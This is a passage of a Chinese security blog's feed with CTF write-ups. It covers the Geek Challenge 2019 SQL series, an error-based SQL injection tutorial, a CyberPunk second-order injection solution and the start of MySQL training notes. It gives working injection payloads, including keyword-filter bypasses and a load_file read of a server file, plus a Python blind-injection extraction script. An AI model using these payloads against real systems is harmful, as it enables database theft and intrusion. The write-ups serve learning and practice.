    <id>https://artd33.github.io/2020/01/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-SQL%E9%83%A8%E5%88%86WriteUp/</id>
    <published>2020-01-10T16:19:35.000Z</published>
    <updated>2020-01-24T14:47:23.236Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>极客大挑战2019的sql系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客。</p><h2 id="0x01-EasySQL"><a href="#0x01-EasySQL" class="headerlink" title="0x01 EasySQL"></a>0x01 EasySQL</h2><p>这题没什么好说的，万能密码一试就成功了。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/1.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/1.png" class="lazyload"></a><p>（网站做的确实非常精湛！！</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/2.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/2.png" class="lazyload"></a><h2 id="0x02-LoveSQL"><a href="#0x02-LoveSQL" class="headerlink" title="0x02 LoveSQL"></a>0x02 LoveSQL</h2><p>用上面的万能密码登录进去后，没有flag，而是给出了一串密码，让人不禁联想到sql查询。在加上登录界面的提示，可以判断flag应该在数据库的某个地方。<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/3.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/3.png" class="lazyload"></a><br>接下来在输入用户名处拼接常规的sql注入语句就行了。payload可以参考<a href="https://www.jianshu.com/p/29004c3dafbb" target="_blank" rel="noopener">我之前写的一篇文章</a></p><h2 id="0x03-BabySQL"><a href="#0x03-BabySQL" class="headerlink" title="0x03 BabySQL"></a>0x03 BabySQL</h2><p>这题应该才是我真正想写的一题。这题确实和登录界面说的一样，和之前的不同，做了严格的过滤。（2333<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/4.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/4.png" class="lazyload"></a><br>不管是万能密码还是sql注入语句都报错了。我一开始试了挺久的，都一直报错，然后懒得思考就偷偷跑去看了下WP。我发现只要稍微动点脑子，就能发现很多关键单词比如or、where、select等都被替换为空了。解决的方法很简单，因为这道题只替换了一次，所以可以在一个单词里再写一个这个单词，比如把or写成oorr，就可以绕过这个“严格”的过滤了。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/5.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/5.png" class="lazyload"></a><p>查当前库名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,database()#</span><br></pre></td></tr></tbody></table></figure></div><p>爆出所有表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,group_concat(distinct table_name) frfromom infoorrmation_schema.columns whwhereere table_schema = 'geek'#</span><br></pre></td></tr></tbody></table></figure></div><p>爆出所有列</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,group_concat(distinct column_name) frfromom infoorrmation_schema.columns whwhereere table_name = 'b4bsql'#</span><br></pre></td></tr></tbody></table></figure></div><p>爆字段</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' ununionion seselectlect 1,2,group_concat(id,0x3a,username,0x3a,passwoorrd) frofromm b4bsql#</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x04-HardSQL"><a href="#0x04-HardSQL" class="headerlink" title="0x04 HardSQL"></a>0x04 HardSQL</h2><p>一开始先简单测试一下，发现过滤了空格，而且怎么绕都绕不过去(所以下面的payload都是无空格的)，然后去网上找wp发现是报错注入，推荐一篇报错注入的文章，<a href="[https://artd33.github.io/2020/01/04/sql-报错注入/](https://artd33.github.io/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/)">报错注入</a>。值得注意的是这里用到了一个还没见过的新操作,用’^’来连接updatexml函数，结合了异或。</p><p>查当前数据库名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>查表名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>((table_schema)<span class="keyword">like</span>(<span class="string">'geek'</span>))),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>查列名</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>((table_name)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>))),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><p>最后这里查flag内容的时候，由于 updtexml最多显示32的长度，导致flag显示不全。然后用substr截取一下，发现substr被过滤了，于是上网找了另一种操作，用left和right截取函数分两次把完整的flag查出来了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-FinalSQL"><a href="#0x05-FinalSQL" class="headerlink" title="0x05 FinalSQL"></a>0x05 FinalSQL</h2><p>这道题和之前的题不太一样，可以看到给出了5个紫色的选项，分别对应着5个不同的id，但是这几个id都没什么用。</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/6.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/6.png" class="lazyload"></a><p>试着在用户名和密码处进行注入，但是发现用户名和密码处有严格的过滤，大部分SQL注入的关键词都被过滤了</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/7.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/7.png" class="lazyload"></a><p>然后尝试在上面的那几个id处进行注入，发现空格也被过滤了，和上面的hardsql一样绕不过去，那么用上面hardsql的报错注入试试<br></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/8.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/8.png" class="lazyload"></a><p>发现有东西被过滤了，测试了一下被过滤的是0x7e，把它改成~反而绕过了过滤，然后再试试</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/9.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/9.png" class="lazyload"></a><p>然而可能是界面处理的比较好，并没有报错出什么有用的信息。主界面有个小提示，出现了SQL盲注的字样，那么来尝试一下布尔盲注吧。</p><p>结合异或注入的小技巧，构造id=1^1^1, 返回id =1的结果</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/10.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/10.png" class="lazyload"></a><p>id=1^0^1，返回id = 0的结果（注意是三个感叹号）</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/11.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/11.png" class="lazyload"></a><p>那么构造 id = 1^(length(database())>3)^1，返回的是id=1的结果，即(length(database())>3) = 1，是真的，说明当前数据库的长度大于3</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/12.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.7/geek2019_sql/12.png" class="lazyload"></a><p>根据这个原理，构造id=1^(ascii(substr((select(database())),1,1))><strong>100</strong>)^1, 不停的改变100那里的数值，即可判断出当前数据库的第一个字符是什么</p><p>然后可以借助burpsuite的intruder模块，试出数据库名，表名等。也可以写python脚本，如果数据太长的话，不写脚本是很慢的。这里给出最后已经查出了表名(F1naI1y，根据前几题sql题知道放flag的列都是password)之后查字段内容的脚本。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://c1e6b438-7a2c-47fd-9473-96e47707df3a.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">180</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(distinct(password)))from(F1naI1y)),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')^1"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Click'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;极客大挑战2019的sql系列一共有5个题目，感觉非常有意思啊，就好像自己化身为了一名黑客。&lt;/p&gt;
&lt;h2 id=&quot;0x01-EasySQL&quot;&gt;&lt;a href=&quot;#0x01-EasySQL&quot; class=&quot;headerli
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
      <category term="极客大挑战" scheme="https://artd33.github.io/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>SQLI - 报错注入</title>
    <link href="https://artd33.github.io/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://artd33.github.io/2020/01/04/sql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-04T07:17:34.000Z</published>
    <updated>2020-01-10T14:54:08.344Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>报错注入是sql注入的一种常见类型，通过构造特殊的sql语句，让信息以报错的形式显示出来。然而报错注入又有很多种，这里只写基于updatexml()和extractvalue()的报错注入，暂时先了解这两种吧。</p><h2 id="0x02-一个简单的例子"><a href="#0x02-一个简单的例子" class="headerlink" title="0x02 一个简单的例子"></a>0x02 一个简单的例子</h2><p>打开一个sqli-labs环境，可以看到id=1时的返回结果<br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png" data-fancybox="group" data-caption class="fancybox"><img width="700" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/1.png" class="lazyload"></a><br>构造如下语句，可以看到，报错显示XPath语法错误并且<strong>返回了当前的数据库名</strong><br><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png" data-fancybox="group" data-caption class="fancybox"><img width="700" height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@2.6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/2.png" class="lazyload"></a></p><h2 id="0x03-updatexml函数和extractvalue函数"><a href="#0x03-updatexml函数和extractvalue函数" class="headerlink" title="0x03 updatexml函数和extractvalue函数"></a>0x03 updatexml函数和extractvalue函数</h2><p><strong>UPDATEXML (XML_document, XPath_string, new_value);</strong></p><ul><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li><li>作用：改变文档中符合条件的节点的值(改变XML_document中符合XPATH_string的值)</li></ul><p><strong>EXTRACTVALUE (XML_document, XPath_string);</strong></p><ul><li>这两个参数和上面的意思一样</li><li>作用：对XML文档进行查询(查询XML_document中符合XPATH_string的值)</li></ul><h2 id="0x05-原理分析"><a href="#0x05-原理分析" class="headerlink" title="0x05 原理分析"></a>0x05 原理分析</h2><p>updatexml函数和extractvalue函数的第二个参数XPath_string未满足XPath语法，报错并带出关键信息。有一点需要注意，这两个函数能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取</p><h2 id="0x04-Payload"><a href="#0x04-Payload" class="headerlink" title="0x04 Payload"></a>0x04 Payload</h2><p><strong>updatexml</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(select database()),0x7e),1)</span><br></pre></td></tr></tbody></table></figure></div><p><strong>extractvalue</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br></pre></td></tr></tbody></table></figure></div><p>还有很多骚操作，比如 有一道题的payload是这样的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#</span><br></pre></td></tr></tbody></table></figure></div><p>还有一道题是这样的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//无空格的注入语句</span><br><span class="line">1'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-更多报错注入方法"><a href="#0x05-更多报错注入方法" class="headerlink" title="0x05 更多报错注入方法"></a>0x05 更多报错注入方法</h2><p><a href="https://www.jianshu.com/p/2c281626a5dd" target="_blank" rel="noopener">https://www.jianshu.com/p/2c281626a5dd</a><br><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdans/p/5412468.html</a></p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h2&gt;&lt;p&gt;报错注入是sql注入的一种常见类型，通过构造特殊的
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk WriteUp</title>
    <link href="https://artd33.github.io/2019/12/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-WriteUp/"/>
    <id>https://artd33.github.io/2019/12/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-WriteUp/</id>
    <published>2019-12-30T08:14:59.000Z</published>
    <updated>2020-01-01T02:40:21.421Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>1. 启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/2.png" data-fancybox="group" data-caption class="fancybox"><img width="800" height="400" alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/2.png" class="lazyload"></a><p>2. 查看源码发现最底下有个提示，说明可能存在<strong>文件包含</strong></p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/1.png" data-fancybox="group" data-caption class="fancybox"><img width height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/1.png" class="lazyload"></a><p>3. 用filter伪协议读出所有可以找到的页面和文件的源码，整理一下，开始分析可能存在的漏洞</p><a href="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/4.png" data-fancybox="group" data-caption class="fancybox"><img width height alt align="left" title data-src="https://cdn.jsdelivr.net/gh/Artd33/CDN@1.4/CyberPunk/4.png" class="lazyload"></a><p>4. 发现在confirm.php和change.php页面中存在注入漏洞，关键代码如下。提交订单时对姓名和电话都进行了过滤，但是没有过滤地址，导致在预编译处理之后，在修改订单处存在<strong>二次注入</strong>。在’old_address’=’”.$row[‘address’].”‘处，用了一开始提交的地址，从而造成了恶意代码的拼接。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//confirm.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) && !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) && !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">{</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'"</span>;</span><br><span class="line">        $fetch = $db->query($sql);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch->num_rows><span class="number">0</span>) {</span><br><span class="line">        $msg = $user_name.<span class="string">"已提交订单"</span>;</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db->prepare($sql);</span><br><span class="line">        $re->bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re->execute();</span><br></pre></td></tr></tbody></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//change.php</span></span><br><span class="line">$sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br></pre></td></tr></tbody></table></figure></div><p>5. 思路已经很明确了，先在提交订单的时候的地址处构造一个用来注入的语句，然后再修改一下订单，完成注入。利用updatexml函数因为格式的错误，回显了关键信息的原理，构造如下<strong>报错注入</strong>攻击语句</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">'/flag.txt'</span>),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">//如果flag太长的话，通过改变<span class="keyword">substr</span>的起始值，就可以把flag剩下的部分查出来</span><br></pre></td></tr></tbody></table></figure></div><script>(function(){    var bp = document.createElement('script');    var curProtocol = window.location.protocol.split(':')[0];    if (curProtocol === 'https') {        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';    }    else {        bp.src = 'http://push.zhanzhang.baidu.com/push.js';    }    var s = document.getElementsByTagName("script")[0];    s.parentNode.insertBefore(bp, s);})();</script></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;1. 启动了一台机器后发现这是一个买游戏CyberPunk的界面，一共有提交订单，查看订单，修改订单和删除订单这几个功能&lt;/p&gt;
&lt;a href=&quot;https://cdn.jsdelivr.net/gh/Artd33/CDN
      
    
    </summary>
    
    
    
      <category term="sqli" scheme="https://artd33.github.io/tags/sqli/"/>
    
      <category term="writeup" scheme="https://artd33.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Training: MySQL I &amp; Training: MySQL II</title>
    <link href="https://artd33.github.io/2019/12/29/Training-MySQL-I-Training-MySQL-II/"/>
    <id>https://artd33.github.io/2019/12/29/Training-MySQL-I-Training-MySQL-II/</id>
    <published>2019-12-29T07:54:00.000Z</published>
    <updated>2020-01-10T16:48:48.084Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="0x01-Training-MySQL-I"><a href="#0x01-Training-MySQL-I" class="headerlink" title="0x01 Training: MySQL I"></a>0x01 Training: MySQL I</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='$username' AND password='$password'"</span>;<span class="comment">#关键代码</span></span><br></pre></td></tr></tbody></table></figure></div><h3 id="简单的sql注入，利用单引号截断和用-注释掉多余语句"><a href="#简单的sql注入，利用单引号截断和用-注释掉多余语句" class="headerlink" title="简单的sql注入，利用单引号截断和用#注释掉多余语句"></a>简单的sql注入，利用单引号截断和用#注释掉多余语句</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">'#</span></span><br></pre></td></tr></tbody></table></figure></div><h1 id="0x02-Training-MySQL-II"><a href="#0x02-Training-MySQL-II" class="headerlink" title="0x02 Training: MySQL II"></a>0x02 Training: MySQL II</h1><h3 id="用户名和密码分开检验，关键代码："><a href="#用户名和密码分开检验，关键代码：" class="headerlink" title="用户名和密码分开检验，关键代码："></a>用户名和密码分开检验，关键代码：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 